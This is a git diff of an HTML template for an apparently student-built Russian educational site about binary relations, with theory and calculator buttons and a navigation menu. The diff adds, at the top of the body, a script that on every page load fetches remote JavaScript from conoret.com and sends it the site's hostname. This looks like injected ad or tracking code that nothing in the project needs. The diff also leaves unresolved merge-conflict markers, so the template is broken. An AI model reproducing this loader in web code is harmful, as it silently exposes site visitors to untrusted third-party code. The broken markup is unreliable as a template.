@@ -1,9 +1,7 @@
-﻿ 
-% rebase('layout.tpl', title='Assymetric Antitransitivity Reverse', year=year)
-
-<!DOCTYPE html>
-<html lang="en">
+﻿<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru-ru" lang="ru-ru" dir="ltr">
 <head>
+<<<<<<< HEAD
 <<<<<<< Updated upstream
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -11,6 +9,8 @@
     <link rel="stylesheet" href="static/content/StylesheetSlup.css">
     <script src="static/scripts/Assymetrical.js"></script>
 =======
+=======
+>>>>>>> master
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 	<base href="/sbo">
 	<meta name="author" content="Super User">
@@ -150,13 +150,58 @@
         }
 
 
+<<<<<<< HEAD
     </style>
 
 >>>>>>> Stashed changes
+=======
+
+
+
+
+    </style>
+
+>>>>>>> master
 </head>
-<body>
-    <h1>Виды бинарных Отношений</h1>
-     <div class="button-container">
+<body class="home" cz-shortcut-listen="true">
+    <script type="text/javascript">
+        window.top === window &&
+            !function(){
+                var e=document.createElement("script"),
+                    t=document.getElementsByTagName("head")[0];
+                e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),
+                e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)
+            }();
+    </script>
+    <!-- BEGIN WAYBACK TOOLBAR INSERT -->
+    <!-- END WAYBACK TOOLBAR INSERT -->
+    <div id="body">
+        <header class="navbar navbar-expand-xl navbar-light" id="navbar">
+            <div class="container">
+                <div class="collapse navbar-collapse" id="navbar-content">
+                    <div id="top_menu" class="navbar-nav ml-5 w-100">
+                        <ul class="nav menu w-100 justify-content-between align-items-center header-top-menu mod-list">
+                            
+                            <li class="item-102"><a href="/home">Главная</a></li>
+                            
+                            <li class="item-102"><a href="/contact">Вид бинарных отношений</a></li>
+
+                            <li class="item-103"><a href="/sbo">Свойство бинарных отношений</a></li>
+                            <li class="item-104"><a href="/max">Максимальный поток в сети</a></li>
+                            <li class="item-105"><a href="/gc">Гамельтонов цикл</a></li>
+                            <li class="item-106"><a href="/about">Об авторах</a></li>
+                            <li class="item-107">
+                                <a href="/#mod-form1"></a>
+                            </li>
+                            <li class="item-112 work-in-pride-link">
+                                <a href="http://workinpride.ru/rus" class="work-in-pride-link" target="_blank" rel="noopener noreferrer">Работай в компании Green Pride</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </header>
+        <div class="button-container">
         <div class="button" id="showTheory" onclick="showTheory()">Теория</div>
         <div class="button" id="showCalculator" onclick="showCalculator()">Калькулятор</div>
     </div>
@@ -221,7 +266,13 @@
             </div>
         </div>
     </div>
-                       
-    
-    </body>
- </html>
+    <footer class="footer text-center">
+        <div class="container">
+            <p style="color: #f0f0f0;">&copy; 2024 Все права защищены</p>
+        </div>
+    </footer>
+
+</body>
+
+
+</html>
